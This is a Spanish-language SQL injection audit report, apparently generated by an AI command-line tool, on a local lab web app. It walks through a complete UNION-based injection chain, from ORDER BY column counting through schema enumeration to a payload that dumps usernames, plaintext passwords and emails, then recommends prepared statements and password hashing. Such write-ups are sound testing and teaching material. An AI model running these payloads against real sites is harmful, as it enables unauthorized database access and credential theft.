# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 14:59:55  
**Analista:** GitHub Copilot CLI  
**Clasificación:** CRÍTICO

---

## 1. Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **SQL Injection (In-band / UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite a un atacante extraer toda la información almacenada en la base de datos sin necesidad de autenticación.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (In-band UNION-based) |
| **Severidad** | CRÍTICA (CVSS 9.8) |
| **Parámetro afectado** | `id` (GET) |
| **URL vulnerable** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Archivo vulnerable** | `/var/www/html/low.php` (línea 11) |
| **Base de datos** | MariaDB 10.11.14-MariaDB-ubu2204 |
| **Base de datos objetivo** | `sqli_demo` |

### Evidencia de detección

Al introducir una comilla simple (`'`) en el parámetro `id`, la aplicación devuelve un error de base de datos que confirma la vulnerabilidad:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

La consulta SQL subyacente tiene la forma:
```sql
SELECT first_name, last_name FROM users WHERE id = '<INPUT>'
```

---

## 3. Explotación

### 3.1 Determinación del número de columnas

Se utilizó `ORDER BY` para determinar que la consulta retorna **2 columnas**:

```
?id=1' ORDER BY 2-- -   → Éxito
?id=1' ORDER BY 3-- -   → Error: "Unknown column '3' in 'ORDER BY'"
```

### 3.2 Extracción de información del servidor

**Payload:**
```
?id=0' UNION SELECT database(),version()-- -
```

**Resultado:**
- Base de datos activa: `sqli_demo`
- Versión del servidor: `10.11.14-MariaDB-ubu2204`

### 3.3 Enumeración de tablas

**Payload:**
```
?id=0' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Resultado:**
- Tablas encontradas: `users`

### 3.4 Enumeración de columnas

**Payload:**
```
?id=0' UNION SELECT GROUP_CONCAT(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```

**Resultado:**
- Columnas: `user_id, first_name, last_name, username, password, email`

### 3.5 Extracción de datos sensibles

**Payload:**
```
?id=0' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,email SEPARATOR 0x7c),2 FROM users-- -
```

**Datos extraídos (credenciales en texto plano):**

| Usuario | Contraseña | Email |
|---------|-----------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

> ⚠️ **Las contraseñas se almacenan en texto plano**, lo que agrava significativamente el impacto de esta vulnerabilidad.

---

## 4. Impacto

- **Confidencialidad:** ALTO — Extracción completa de la base de datos incluyendo credenciales.
- **Integridad:** ALTO — Un atacante podría modificar o eliminar datos.
- **Disponibilidad:** MEDIO — Posibilidad de ejecutar consultas destructivas.

---

## 5. Causa Raíz

La aplicación construye consultas SQL concatenando directamente la entrada del usuario sin sanitización ni uso de consultas preparadas (prepared statements):

```php
// Código vulnerable (aproximación basada en el error revelado)
$query = "SELECT first_name, last_name FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## 6. Recomendaciones

### 6.1 Inmediatas (Críticas)
1. **Usar Prepared Statements / Consultas Parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Hashear las contraseñas** usando `password_hash()` con bcrypt o Argon2.

3. **Deshabilitar la visualización de errores** en producción (`display_errors = Off`).

### 6.2 A Corto Plazo
4. **Validar y sanitizar** todas las entradas de usuario (whitelist de tipos esperados).
5. **Implementar un WAF** (Web Application Firewall) como ModSecurity.
6. **Aplicar el principio de mínimo privilegio** al usuario de base de datos.

### 6.3 A Largo Plazo
7. **Realizar auditorías de seguridad** periódicas del código.
8. **Implementar SAST/DAST** en el pipeline de CI/CD.

---

## 7. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection que permite la extracción completa de la base de datos, incluyendo credenciales de 8 usuarios almacenadas en texto plano. La explotación es trivial y no requiere autenticación previa. Se requiere corrección inmediata.

---

*Informe generado por GitHub Copilot CLI — Análisis de seguridad autorizado*
